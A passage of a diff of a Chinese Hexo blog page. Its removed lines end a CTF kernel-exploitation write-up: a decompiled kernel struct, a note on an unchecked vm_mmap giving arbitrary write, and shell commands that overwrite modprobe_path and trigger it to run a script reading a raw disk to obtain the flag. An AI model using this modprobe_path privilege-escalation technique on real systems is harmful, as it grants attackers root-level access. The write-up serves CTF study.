vma_pages;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> __int64 p;</span><br><span class="line">	<span class="type">unsigned</span> __int64 argmin;</span><br><span class="line">	<span class="type">unsigned</span> __int32 have_execfd : <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> __int32 execfd_creds : <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> __int32 secureexec : <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> __int32 point_of_no_return : <span class="number">1</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">executable</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">interpreter</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">cred</span>;</span></span><br><span class="line">	<span class="type">int</span> unsafe;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> per_clear;</span><br><span class="line">	<span class="type">int</span> argc;</span><br><span class="line">	<span class="type">int</span> envc;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *filename;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *interp;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *fdpath;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> interp_flags;</span><br><span class="line">	<span class="type">int</span> execfd;</span><br><span class="line">	<span class="type">unsigned</span> __int64 loader;</span><br><span class="line">	<span class="type">unsigned</span> __int64 exec;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim_stack</span>;</span></span><br><span class="line">	<span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p>确定结构体后，发现有这样一行:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vm_mmap(<span class="number">0LL</span>, v6, <span class="number">256LL</span>, <span class="number">7LL</span>, <span class="number">18LL</span>, <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure>
-<p>对于地址没有检查，造成了任意地址写，故考虑覆写modprobe_path.</p>
-<hr>
-<h2 id="exploition"><a href="#exploition" class="headerlink" title="exploition"></a>exploition</h2><h4 id="先将modprobe-path覆写为目标文件"><a href="#先将modprobe-path覆写为目标文件" class="headerlink" title="先将modprobe_path覆写为目标文件:"></a>先将modprobe_path覆写为目标文件:</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -ne <span class="string">&quot;\x80\x81\x03\x82\xff\xff\xff\xff/tmp/a&quot;</span> &gt; exp.bloat</span><br></pre></td></tr></table></figure>
-<h4 id="将目标操作写入a"><a href="#将目标操作写入a" class="headerlink" title="将目标操作写入a:"></a>将目标操作写入a:</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;#!/bin/sh\ncat /dev/sda &gt; /tmp/flag&quot;</span> &gt; /tmp/a</span><br></pre></td></tr></table></figure>
-<h4 id="触发调用modprobe-path"><a href="#触发调用modprobe-path" class="headerlink" title="触发调用modprobe_path:"></a>触发调用modprobe_path:</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> b</span><br><span class="line"><span class="built_in">chmod</span> +x b a exp.bloat</span><br><span class="line">/tmp/exp.bloat</span><br><span class="line">/tmp/b</span><br></pre></td></tr></table></figure>
-<hr>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /tmp/flag</span><br><span class="line">utflag&#123;oops_forgot_to_use_put_user283558318&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/s &amp;modprobe_path</span><br><span class="line">0xffffffff82038180:     <span class="string">&quot;/tmp/a&quot;</span></span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -857,7 +905,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-count">17</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -870,7 +918,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-count">24</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -915,13 +963,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">57k</span>
+    <span title="站点总字数">62k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">52 分钟</span>
+    <span title="站点阅读时长">57 分钟</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener external nofollow noreferrer" target="_blank">NexT.Muse</a> 强力驱动
   </div>
